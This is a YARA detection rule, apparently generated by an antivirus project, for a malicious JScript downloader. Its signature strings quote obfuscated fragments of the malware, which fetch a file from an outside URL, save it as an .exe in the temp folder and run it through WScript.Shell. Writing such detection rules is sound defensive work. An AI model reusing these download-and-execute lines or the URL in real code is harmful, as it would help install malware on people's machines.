rule sig_20160401_d870cc47dd987117dddd47d76c11b082 {
  meta:
    description = "datamaliciousorder - file 20160401_d870cc47dd987117dddd47d76c11b082.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ad48240b734e8bf4765c0003fe0231a360f2d96f8ffb2a2399dd9c2fdbe8e921"

  strings:
    $s1  = "var HkBdd = function XwLh() {return WScript[UoPdp](\"WScript\"+\".Shell\");}(), VbyZbi = 11;" fullword ascii
    $s2  = "function EnOww(TnFk, RjHfj){EuMj = EuMj * 1; return TnFk - RjHfj;};" fullword ascii
    $s3  = "HgqFi[OffBr](\"G\" + \"ET\", \"http://ekotrade.linuxpl.info/b6dsa\", false);" fullword ascii
    $s4  = "if (HgqFi[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZpKio() {return HkBdd[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"hqom0QTc.ex\" + \"e\";};" fullword ascii
    $s6  = "function CqVtd(){return EhGpq + \"\";};" fullword ascii
    $s7  = "function CieDo() {return ((KwjIh == true) && (KwjIh == NtCfd)) ? 1 : EuMj;};" fullword ascii
    $s8  = "}while (QquEx);" fullword ascii
    $s9  = "var XkLh = false;" fullword ascii
    $s10 = "function DpEr()" fullword ascii
    $s11 = "var NtCfd = false;" fullword ascii
    $s12 = "function AbxNf(SwNzn) {var TkzBt = (1, 2, 3, 4, 5, SwNzn); return TkzBt;};" fullword ascii
    $s13 = "var KwjIh = false;" fullword ascii
    $s14 = "NtCfd = true; " fullword ascii
    $s15 = "return EnOww(FnuAy, NcmTd);" fullword ascii
    $s16 = "function ElkMte(ZtxEea){HkBdd[\"R\"+\"un\"](ZtxEea, EuMj, EuMj);};" fullword ascii
    $s17 = "var IgGf = new this[\"Date\"]();" fullword ascii
    $s18 = "KwjIh = true; " fullword ascii
    $s19 = "function FyrRdp(){return UoPdp;};" fullword ascii
    $s20 = "function VmUu(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}